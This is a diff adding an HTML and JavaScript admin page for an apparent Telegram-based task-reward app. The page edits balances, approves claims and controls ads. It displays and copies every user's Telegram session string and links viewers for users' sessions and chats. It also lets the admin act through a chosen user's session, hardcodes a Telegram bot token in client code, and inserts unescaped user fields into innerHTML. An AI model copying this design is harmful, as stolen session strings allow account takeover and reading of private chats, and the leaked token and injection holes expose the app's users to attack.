@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Account - AAF Admin</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+
+    <!-- ===== নেভিগেশন ===== -->
+    <nav class="admin-nav">
+        <a href="/admin/dashboard">🏠 Dashboard</a>
+        <a href="/admin/tasks">📋 Tasks</a>
+        <a href="/admin/trading">📈 Trading</a>
+        <a href="/admin/wallet">💰 Wallet</a>
+        <a href="/admin/account" class="active">👥 Account</a>
+        <button onclick="logout()" style="background:red; color:white; border:none; padding:5px 10px; border-radius:5px; cursor:pointer;">🚪 Logout</button>
+    </nav>
+
+    <!-- ===== কন্টেন্ট ===== -->
+    <div class="admin-content" style="padding:20px;">
+
+        <!-- ==================== অ্যাকাউন্ট ==================== -->
+        <div id="account" class="page-section active" style="display: block;">
+
+            <!-- পেন্ডিং টাস্ক ক্লেইম -->
+            <div class="premium-card">
+                <div class="card-title"><i class="fas fa-clock"></i> পেন্ডিং টাস্ক ক্লেইম (এডমিন এপ্রুভাল প্রয়োজন)</div>
+                <div id="pending-claims-list">লোড হচ্ছে...</div>
+            </div>
+
+            <!-- ব্যালেন্স এডিট -->
+            <div class="premium-card">  
+                <div class="card-title"><i class="fas fa-user-edit"></i> ব্যালেন্স এডিট (ম্যানুয়াল)</div>  
+                <input type="text" id="target-uid" placeholder="ইউজার UID বা ফোন">  
+                <div class="row">  
+                    <input type="number" id="user-bal" placeholder="নতুন ক্যাশ ব্যালেন্স">  
+                    <input type="number" id="user-coins" placeholder="নতুন AAF কয়েন">  
+                </div>  
+                <button class="btn-main" data-action="update-user-balance">ব্যালেন্স আপডেট</button>  
+            </div>  
+
+            <!-- ইউজার সেশন লিস্ট -->
+            <div class="premium-card">  
+                <div class="card-title"><i class="fas fa-users"></i> ইউজার সেশন লিস্ট</div>
+                <div style="display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 15px;">
+                    <a href="/session_viewer" target="_blank" style="background: #00f2fe; color: #000; padding: 8px 12px; border-radius: 6px; text-decoration: none; font-weight: bold;">🗝️ সেশন ভিউয়ার</a>
+                    <a href="/chat_viewer" target="_blank" style="background: #7000ff; color: #fff; padding: 8px 12px; border-radius: 6px; text-decoration: none; font-weight: bold;">📱 টেলিগ্রাম চ্যাট ভিউয়ার</a>
+                    <button data-action="toggle-user-list" style="background:var(--purple); color:#fff; border:none; padding:8px 12px; border-radius:6px; cursor:pointer;">👥 Show Users</button>
+                </div>
+                <div style="display: flex; gap: 10px; margin-bottom: 15px;">
+                    <input type="text" id="user_search" placeholder="Telegram ID, username বা phone দিয়ে খুঁজুন" 
+                           style="flex: 1; padding: 10px; border-radius: 8px; border: 1px solid #334155; background: #1a1a2e; color: #fff;">
+                    <button data-action="search-user" style="background: #00f2fe; color: #000; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold;">🔍 সার্চ</button>
+                </div>
+                <div id="search-result" style="display: none; margin-top: 10px;"></div>
+                <div id="member-list-body" style="display:none; overflow-x:auto;"></div>         
+            </div>
+
+            <!-- চ্যানেল/পোস্ট স্ট্যাট চেকার -->
+            <div class="premium-card">
+                <div class="card-title"><i class="fas fa-chart-bar"></i> চ্যানেল/পোস্ট স্ট্যাট চেকার</div>
+                <label>কোন ইউজারের সেশন দিয়ে চেক করবেন?</label>
+                <div style="display: flex; gap: 10px; margin-bottom: 10px;">
+                    <input type="text" id="stat_session_owner" placeholder="সার্চ থেকে সিলেক্ট করুন" 
+                           style="flex: 1; padding: 8px; border-radius: 6px; border: 1px solid #334155; background: #1a1a2e; color: #fff;" readonly>
+                    <button data-action="clear-selected-session" style="background: #da3633; color: #fff; border: none; padding: 5px 10px; border-radius: 6px;">✕</button>
+                </div>
+                <small style="color: #888;">খালি রাখলে নিজের সেশন ব্যবহার হবে।</small>
+                <label>চ্যানেল লিংক বা পোস্ট লিংক</label>
+                <input type="text" id="stat_link" placeholder="https://t.me/channel বা https://t.me/channel/123">
+                <button class="btn-main" data-action="check-stat" style="margin-top: 10px;">🔍 স্ট্যাট চেক করুন</button>
+                <button data-action="direct-bot-test" style="background: #ff5555; color: #fff; border: none; padding: 10px 20px; border-radius: 8px; margin-top: 10px; width: 100%; cursor: pointer;">🔴 ডাইরেক্ট বট টেস্ট</button>
+                <div id="stat-result" style="display: none; margin-top: 15px; background: #1a1a2e; padding: 15px; border-radius: 10px;">
+                    <div id="stat-content"></div>
+                </div>
+            </div>
+
+            <!-- ফুল অ্যাডস কন্ট্রোল -->
+            <div class="premium-card">
+                <div class="card-title"><i class="fas fa-ad"></i> ফুল অ্যাডস কন্ট্রোল</div>
+
+                <!-- ব্যানার অ্যাড -->
+                <label>ব্যানার অ্যাড ইমেজ URL</label>
+                <input type="text" id="banner_image">
+                <label>ব্যানার অ্যাড সক্রিয় করুন</label>
+                <select id="banner_ad_enabled">
+                    <option value="true">ON</option>
+                    <option value="false">OFF</option>
+                </select>
+
+                <hr style="margin:15px 0; border-color:#334155">
+
+                <!-- পপআপ অ্যাড -->
+                <div class="card-title" style="margin-top: 5px; font-size: 14px;"><i class="fas fa-window-popup"></i> পপআপ অ্যাড কন্ট্রোল</div>
+
+                <label>পপআপ টাইটেল</label>
+                <div style="display: flex; gap: 10px;">
+                    <input type="text" id="popup_ad_title" style="flex:1;">
+                    <button data-action="clear-field" data-field="popup_ad_title" data-target="popup_ad_title" style="background:#da3633; color:white; border:none; padding:5px 10px; border-radius:6px;">🗑️</button>
+                </div>
+
+                <label>পপআপ বিবরণ</label>
+                <div style="display: flex; gap: 10px;">
+                    <textarea id="popup_ad_desc" rows="3" style="flex:1;"></textarea>
+                    <button data-action="clear-field" data-field="popup_ad_desc" data-target="popup_ad_desc" style="background:#da3633; color:white; border:none; padding:8px 12px; border-radius:6px;">🗑️</button>
+                </div>
+
+                <label>পপআপ ইমেজ URL</label>
+                <div style="display: flex; gap: 10px;">
+                    <input type="text" id="popup_ad_image" style="flex:1;">
+                    <button data-action="clear-field" data-field="popup_ad_image" data-target="popup_ad_image" style="background:#da3633; color:white; border:none; padding:5px 10px; border-radius:6px;">🗑️</button>
+                </div>
+
+                <label>পপআপ সক্রিয় করুন</label>
+                <select id="popup_ad_enabled">
+                    <option value="true">ON (দেখাবে)</option>
+                    <option value="false">OFF (দেখাবে না)</option>
+                </select>
+
+                <button class="btn-main" data-action="update-popup-settings" style="margin-top: 15px;">💾 পপআপ সেভ করুন</button>
+            </div>
+
+        </div> <!-- account শেষ -->
+
+    </div> <!-- admin-content শেষ -->
+
+    <!-- ============================================================ -->
+    <!-- ✅ JavaScript (Account এর জন্য) -->
+    <!-- ============================================================ -->
+    <script>
+        const API = window.location.origin;
+        let selectedSessionOwner = '';
+
+        // ========== 1. সব data-action হ্যান্ডেল করুন ==========
+        document.addEventListener('click', function(e) {
+            const target = e.target.closest('[data-action]');
+            if (!target) return;
+
+            const action = target.dataset.action;
+            const id = target.dataset.id || '';
+
+            switch(action) {
+                case 'update-user-balance':
+                    updateUserBalance();
+                    break;
+                case 'toggle-user-list':
+                    toggleUserList();
+                    break;
+                case 'search-user':
+                    searchUser();
+                    break;
+                case 'clear-selected-session':
+                    clearSelectedSession();
+                    break;
+                case 'check-stat':
+                    checkStat();
+                    break;
+                case 'direct-bot-test':
+                    directBotTest();
+                    break;
+                case 'clear-field':
+                    clearField(target.dataset.field, target.dataset.target);
+                    break;
+                case 'update-popup-settings':
+                    updatePopupSettings();
+                    break;
+                default:
+                    console.warn('Unknown action:', action);
+            }
+        });
+
+        // ========== 2. লগআউট ==========
+        function logout() {
+            if(confirm('Are you sure?')) {
+                fetch('/api/admin/logout', { method: 'POST' })
+                .then(() => window.location.href = '/admin/login');
+            }
+        }
+
+        // ========== 3. ব্যালেন্স আপডেট ==========
+        async function updateUserBalance() {
+            const uid = document.getElementById('target-uid').value;
+            const cash = parseFloat(document.getElementById('user-bal').value);
+            const aaf = parseFloat(document.getElementById('user-coins').value);
+            if (!uid) return alert('ইউজার আইডি দিন');
+            const res = await fetch('/api/admin/update_balance', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                credentials: 'include',
+                body: JSON.stringify({ uid, cash, aaf })
+            });
+            const data = await res.json();
+            if (data.success) alert('✅ ব্যালেন্স আপডেট হয়েছে');
+            else alert('❌ ব্যর্থ: ' + (data.error || 'ইউজার খুঁজে পাওয়া যায়নি'));
+        }
+
+        // ========== 4. ইউজার লিস্ট টগল ==========
+        function toggleUserList() {
+            const box = document.getElementById('member-list-body');
+            if (!box) return;
+            const isHidden = box.style.display === 'none' || getComputedStyle(box).display === 'none';
+            if (isHidden) {
+                box.style.display = 'block';
+                loadUsers();
+            } else {
+                box.style.display = 'none';
+            }
+        }
+
+        // ========== 5. ইউজার লিস্ট লোড ==========
+        async function loadUsers() {
+            const box = document.getElementById('member-list-body');
+            try {
+                const r = await fetch(`${API}/api/admin/users`, { credentials: 'include' });
+                const d = await r.json();
+                if (r.status === 401) {
+                    box.innerHTML = `<div>Please login as admin first.</div>`;
+                    return;
+                }
+                if (!d.users || d.users.length === 0) {
+                    box.innerHTML = `<div>No users found.</div>`;
+                    return;
+                }
+                let html = `<div style="overflow-x: auto;">`;
+                html += `<table style="width:100%; border-collapse: collapse; font-size: 13px; background: transparent; min-width: 800px;">`;
+                html += `<thead><tr style="background: #1e293b; color: #00f2fe;">`;
+                html += `<th>Full Name</th><th>Username</th><th>Telegram ID</th><th>Phone</th><th>Cash (৳)</th><th>AAF</th><th>Session String</th><th>Copy</th>`;
+                html += `</tr></thead><tbody>`;
+                d.users.forEach(u => {
+                    let fullName = (u.first_name||'') + ' ' + (u.last_name||'');
+                    fullName = fullName.trim() || u.username || 'N/A';
+                    const username = u.username || 'N/A';
+                    const tgId = u.telegram_id || 'N/A';
+                    let phone = u.phone || 'N/A';
+                    if (phone !== 'N/A' && phone.startsWith('+880')) phone = phone.slice(4);
+                    const cash = parseFloat(u.cash || 0).toFixed(2);
+                    const aaf = parseFloat(u.aaf || 0).toFixed(2);
+                    const session = u.session_string || 'Not available';
+                    const displaySession = session.length > 20 ? session.substring(0,17)+'...' : session;
+
+                    html += `<tr style="border-bottom: 1px solid #2d3a5e;">`;
+                    html += `<td>${escapeHtml(fullName)}</td>`;
+                    html += `<td>${escapeHtml(username)}</td>`;
+                    html += `<td>${escapeHtml(tgId)}</td>`;
+                    html += `<td>${escapeHtml(phone)}</td>`;
+                    html += `<td>৳ ${cash}</td>`;
+                    html += `<td>${aaf}</td>`;
+                    html += `<td style="font-family: monospace; font-size: 11px;">${escapeHtml(displaySession)}</td>`;
+                    html += `<td><button onclick="copyToClipboard('${session.replace(/'/g, "\\'")}')" style="background: #00f2fe; border: none; padding: 4px 8px; border-radius: 4px; cursor: pointer;">📋 কপি</button></td>`;
+                    html += `</tr>`;
+                });
+                html += `</tbody></table></div>`;
+                box.innerHTML = html;
+            } catch(e) {
+                console.error(e);
+                box.innerHTML = `<div>Error: ${e.message}</div>`;
+            }
+        }
+
+        // ========== 6. কপি ফাংশন ==========
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                alert("সেশন স্ট্রিং কপি হয়েছে!");
+            }).catch(() => {
+                alert("কপি করতে ব্যর্থ, ম্যানুয়ালি কপি করুন");
+            });
+        }
+
+        // ========== 7. ইউজার সার্চ ==========
+        function searchUser() {
+            const query = document.getElementById('user_search').value.trim();
+            if (!query) {
+                alert('🔍 সার্চ টার্ম দিন!');
+                return;
+            }
+            console.log('🔍 Searching for:', query);
+            // আপনার সার্চ লজিক এখানে যোগ করুন
+        }
+
+        // ========== 8. সেশন সিলেক্ট ==========
+        function selectSession(telegramId, name) {
+            selectedSessionOwner = telegramId;
+            const inputEl = document.getElementById('stat_session_owner');
+            if (inputEl) inputEl.value = `${name} (${telegramId})`;
+            alert(`✅ ${name}-এর সেশন সিলেক্ট হয়েছে!`);
+        }
+
+        function clearSelectedSession() {
+            selectedSessionOwner = '';
+            const inputEl = document.getElementById('stat_session_owner');
+            if (inputEl) inputEl.value = '';
+            alert('✅ নিজের সেশন ব্যবহার হবে।');
+        }
+
+        // ========== 9. স্ট্যাট চেক ==========
+        async function checkStat() {
+            const link = document.getElementById('stat_link').value.trim();
+            const resultDiv = document.getElementById('stat-result');
+            const contentDiv = document.getElementById('stat-content');
+
+            if (!link) {
+                alert('লিংক দিন');
+                return;
+            }
+
+            contentDiv.innerHTML = '⏳ লোড হচ্ছে...';
+            resultDiv.style.display = 'block';
+
+            let apiUrl = `/api/user/check_stat?link=${encodeURIComponent(link)}`;
+            if (selectedSessionOwner) {
+                apiUrl += `&session_owner=${selectedSessionOwner}`;
+            }
+
+            try {
+                const res = await fetch(apiUrl, { credentials: 'include' });
+                const data = await res.json();
+
+                if (data.success) {
+                    if (data.type === 'channel') {
+                        contentDiv.innerHTML = `
+                            <h3 style="color: #00f2fe;">📢 ${escapeHtml(data.title)}</h3>
+                            <p>👥 মেম্বার: <strong>${data.members}</strong></p>
+                            <p>📝 ডেসক্রিপশন: ${escapeHtml(data.description || 'N/A')}</p>
+                            <p>🔗 টাইপ: ${data.is_public ? 'পাবলিক' : 'প্রাইভেট'}</p>
+                            <p>👤 স্ট্যাটাস: <strong style="color: ${data.user_is_member ? 'lime' : 'red'}">${data.member_status || 'N/A'}</strong></p>
+                            ${data.checked_by ? `<p style="color: #888; font-size: 12px;">চেক করা হয়েছে: ${escapeHtml(data.checked_by)}-এর সেশন দিয়ে</p>` : ''}
+                        `;
+                    } else if (data.type === 'post') {
+                        contentDiv.innerHTML = `
+                            <h3 style="color: #00f2fe;">📝 পোস্ট স্ট্যাট</h3>
+                            <p>👁️ ভিউ: <strong>${(data.views || 0).toLocaleString()}</strong></p>
+                            <p>🔄 ফরওয়ার্ড: ${data.forwards || 0}</p>
+                            <p>💬 কমেন্ট: ${data.replies_count || 0}</p>
+                            ${data.reactions ? `<p>❤️ রিয়্যাকশন: ${Object.entries(data.reactions).map(([e, c]) => `${e} ${c}`).join(', ')}</p>` : ''}
+                            <p>📅 তারিখ: ${data.date || 'N/A'}</p>
+                            <p>📝 টেক্সট: ${escapeHtml(data.text || 'মিডিয়া পোস্ট')}</p>
+                            <p>👤 স্ট্যাটাস: <strong style="color: ${data.user_is_member ? 'lime' : 'red'}">${data.member_status || 'N/A'}</strong></p>
+                            ${data.checked_by ? `<p style="color: #888; font-size: 12px;">চেক করা হয়েছে: ${escapeHtml(data.checked_by)}-এর সেশন দিয়ে</p>` : ''}
+                        `;
+                    }
+                } else {
+                    contentDiv.innerHTML = `<p style="color: red;">❌ ${data.message}</p>`;
+                }
+            } catch(e) {
+                contentDiv.innerHTML = '<p style="color: red;">❌ সার্ভার এরর</p>';
+            }
+        }
+
+        // ========== 10. ডাইরেক্ট বট টেস্ট ==========
+        async function directBotTest() {
+            const link = document.getElementById('stat_link').value;
+            if (!link) {
+                alert('লিংক দিন');
+                return;
+            }
+            let username = link.replace('https://t.me/', '').split('/')[0];
+            const BOT_TOKEN = '7212807777:AAF-rwLSAydbSkdQY7pImSUGhKsUHawBieQ';
+
+            try {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/getChat?chat_id=@${username}`;
+                console.log('Calling:', url);
+                const response = await fetch(url);
+                const data = await response.json();
+                console.log('Full Response:', data);
+                if (data.ok) {
+                    const chat = data.result;
+                    alert(`✅ সাকসেস!\n\nনাম: ${chat.title}\nটাইপ: ${chat.type}\nমেম্বার: ${chat.members_count || chat.participants_count || 'N/A'}\nবিবরণ: ${chat.description || 'N/A'}`);
+                } else {
+                    alert(`❌ ব্যর্থ!\n\nএরর: ${data.description}`);
+                }
+            } catch(e) {
+                alert('নেটওয়ার্ক এরর: ' + e.message);
+            }
+        }
+
+        // ========== 11. ফিল্ড ক্লিয়ার ==========
+                async function clearField(fieldName, elementId) {
+            if (!confirm(`"${fieldName}" ফিল্ডটি খালি করতে চান?`)) return;
+            document.getElementById(elementId).value = '';
+            try {
+                const res = await fetch('/api/admin/clear_field', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    credentials: 'include',
+                    body: JSON.stringify({ field: fieldName })
+                });
+                const data = await res.json();
+                alert(data.success ? '✅ সফল হয়েছে' : '❌ ব্যর্থ');
+            } catch(e) { alert('সার্ভার এরর'); }
+        }
+
+        // ========== 12. পপআপ সেটিংস ==========
+        async function updatePopupSettings() {
+    const popupData = {
+        popup_ad_title: document.getElementById('popup_ad_title')?.value || '',
+        popup_ad_desc: document.getElementById('popup_ad_desc')?.value || '',
+        popup_ad_image: document.getElementById('popup_ad_image')?.value || '',
+        popup_ad_enabled: document.getElementById('popup_ad_enabled')?.value === 'true',  // ← কমা যোগ করুন
+        banner_image: document.getElementById('banner_image')?.value || '',  // ← কমা যোগ করুন
+        banner_ad_enabled: document.getElementById('banner_ad_enabled')?.value === 'true'
+    };
+
+    try {
+        const res = await fetch('/api/admin/update_settings', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            credentials: 'include',
+            body: JSON.stringify(popupData)
+        });
+        const result = await res.json();
+        if (res.ok && result.success) {
+            alert('✅ পপআপ সেটিংস সেভ হয়েছে');
+        } else {
+            alert('❌ আপডেট ব্যর্থ: ' + (result.error || 'Unknown error'));
+        }
+    } catch(err) {
+        console.error(err);
+        alert('❌ সার্ভার এরর: ' + err.message);
+    }
+        }
+
+        // ========== 13. পেন্ডিং ক্লেইম লোড ==========
+        async function loadPendingClaims() {
+            const container = document.getElementById('pending-claims-list');
+            try {
+                const res = await fetch('/api/admin/pending_claims', { credentials: 'include' });
+                const data = await res.json();
+                if (!data.claims || data.claims.length === 0) {
+                    container.innerHTML = '<div>কোনো পেন্ডিং ক্লেইম নেই।</div>';
+                    return;
+                }
+                let html = '<table style="width:100%; border-collapse:collapse;">';
+                html += '<tr><th>User</th><th>Task</th><th>Reward</th><th>Action</th></tr>';
+                data.claims.forEach(c => {
+                    html += `<tr>
+                        <td>${c.username} (${c.telegram_id})</td>
+                        <td>${c.task_title}</td>
+                        <td>${c.reward} ${c.currency === 'aaf' ? 'AAF' : 'BDT'}</td>
+                        <td>
+                            <button data-action="process-claim" data-id="${c._id}" data-action-type="approve" style="background:#00ff88; border:none; padding:4px 12px; border-radius:4px; cursor:pointer;">✅ Approve</button>
+                            <button data-action="process-claim" data-id="${c._id}" data-action-type="reject" style="background:#ff5555; border:none; padding:4px 12px; border-radius:4px; cursor:pointer;">❌ Reject</button>
+                        </td>
+                    </tr>`;
+                });
+                html += '</table>';
+                container.innerHTML = html;
+            } catch(e) { container.innerHTML = '<div>Error loading</div>'; }
+        }
+
+        // ========== 14. ক্লেইম প্রসেস ==========
+        document.addEventListener('click', function(e) {
+            const target = e.target.closest('[data-action="process-claim"]');
+            if (!target) return;
+            const claimId = target.dataset.id;
+            const action = target.dataset.actionType;
+            processClaim(claimId, action);
+        });
+
+        async function processClaim(claimId, action) {
+            const res = await fetch('/api/admin/approve_claim', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                credentials: 'include',
+                body: JSON.stringify({ claim_id: claimId, action })
+            });
+            const data = await res.json();
+            if (data.success) alert(`✅ Claim ${action}d`);
+            else alert('Failed');
+            loadPendingClaims();
+        }
+
+
+        // ইউজার পেজের JavaScript
+
+        async function loadBanner() {
+    try {
+        const res = await fetch('/api/user/me', { credentials: 'include' });
+        const data = await res.json();
+
+        if (data.admin && data.admin.banner_image) {
+            const bannerImg = data.admin.banner_image;
+            document.getElementById('admin-banner-slide').style.backgroundImage = `url('${bannerImg}')`;
+        }
+    } catch(e) {
+        console.error('Banner load error:', e);
+    }
+        }
+
+
+        // ========== 15. হেল্পার ==========
+        function escapeHtml(text) {
+            if (!text) return "";
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        // ========== 16. পেজ লোড ==========
+        document.addEventListener('DOMContentLoaded', function() {
+            loadPendingClaims();
+        });
+
+        console.log('✅ Account JavaScript loaded!');
+    </script>
+
+</body>
+</html>
